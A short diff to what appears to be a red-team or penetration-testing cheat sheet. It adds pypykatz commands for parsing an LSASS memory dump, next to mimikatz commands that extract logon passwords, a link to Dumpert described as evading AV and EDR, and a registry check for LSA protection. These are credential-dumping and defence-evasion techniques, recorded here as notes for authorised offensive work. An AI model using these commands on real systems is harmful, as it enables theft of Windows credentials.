@@ -321,6 +321,9 @@ PrivEsc
         minikatz "sekurlsa::minidump lsass_612.dmp" "sekurlsa::logonPasswords" (must be on same Arch)
     Dumpert: https://github.com/outflanknl/Dumpert (Should avoid AV and EDR)
     
+  Python dmp tool: pypykatz (install: pip3 install pypykatz)
+        python -m pypykatz lsa minidump lsass.DMP 
+  
   Check for Protected LSASS (Reboot required if changing values)
     shell reg query "hklm\system\currentcontrolset\control\lsa" 
       LSA Protection: RunAsPPL (0x1 = Protected; Reboot required if changed to 0)
